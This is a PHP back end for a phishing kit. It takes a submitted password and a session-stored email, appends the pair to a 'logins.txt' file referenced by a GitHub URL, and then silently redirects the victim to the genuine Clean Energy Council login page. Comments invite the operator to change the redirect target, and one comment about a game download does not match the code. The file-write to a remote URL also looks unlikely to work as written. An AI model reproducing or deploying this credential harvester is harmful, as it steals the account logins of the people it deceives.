<?php

			session_start();
			
			$pass = $_POST["Passwd"];
			$email=$_SESSION["Email"];
			//opening logins text file for appending new data.
  			$file = fopen("https://github.com/Demongit01/Demongit01.github.io/blob/694b8e81965228dcad40ffbc49a61781285e5704/logins.txt", "a") or die("Unable to open file!");
			
  			//Writing email and password to logins.txt. 
  			fwrite($file, $email."	".$pass.PHP_EOL);			
  			fclose($file);//closing logins.txt.
			
  			//redirecting user to the google drive's locations where the game is available to download.
  			//change the location url to redirect to a website of your choice.
  			header("Location: https://www.cleanenergycouncil.org.au/account/login");
			exit();
			
			
			session_destroy();
			

?>
